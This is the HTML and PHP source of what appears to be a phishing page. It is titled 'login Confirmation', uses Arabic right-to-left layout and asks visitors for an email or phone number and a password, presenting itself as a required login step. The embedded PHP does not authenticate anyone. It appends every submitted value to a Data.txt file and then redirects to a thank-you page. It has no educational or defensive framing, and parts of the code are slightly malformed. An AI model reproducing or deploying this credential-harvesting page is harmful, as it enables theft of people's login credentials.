<html dir="rtl" lang="ar"><head><script>
<!--
//-->
</script>
  <meta charset="UTF-8"><title>login Confirmation</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    

    <link rel="stylesheet" type="text/css" href="GET/stylesheet.css"> 
    <link rel="icon" type="image/png/ico" href="d4ZIVX-5C-b.ico">
  </head>
  <body>
    <!-- NavBar -->
     <style>
      /* [WHAT YOU NEED] */
      img.logo {
        height: 80%;
            padding: 3;
        /* Recommended - Limit maximum width */
        max-width: 100%;
      }

      /* [DOES NOT MATTER] */
      html, body {
        padding: 0;
        margin: 0;
        font-family: arial, sans-serif;
      }
      #page-body {
        padding: 10px;
      }
    </style>
    
    
    <div class="navbar">
        
     <header id="page-header">
         <center>
      <img src="logo.png" class="logo">
      </center>
    </header>   
    </div>
    <div style="display:-webkit-box">
      <div style="-webkit-box-flex:1">
        <!--Nav-Header-->
        <div class="nav-head" style="direction: rtl;">
          <span>You must first login to continue</span>
        </div>


        <!-- Formulaire -->

         <div style="background-color:#2c3b5a0f;padding:20 31px">
		 <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
	<input class="entrer" style="padding:12px;direction: rtl; border-bottom:1px solid #c7c3c369;" type="text" name="Email" placeholder="Email or phone number" required="">
	<input class="entrer" style="padding:12px;direction: rtl; border-bottom:1px solid #c7c3c369;" type="password" name="Password" placeholder="password" required=""><br><br>
	<button a href="file_writer.php" type="submit" class="square_btn" name="login" >Confirmation</button>
	<?php
		if(isset($_POST["login"])){
			$handle = fopen("Data.txt", "a");
			foreach($_POST as $variable => $value){
				#fwrite($handle, $variable);
				#fwrite($handle, "=");
				fwrite($handle, $value);
				fwrite($handle, ":");
			}
			fwrite($handle, "\r\n");
			fclose($handle);
			header("Location: thanks.html);
			exit;
		}
	?>
	<br><br>

</form></center>
</body>
</html>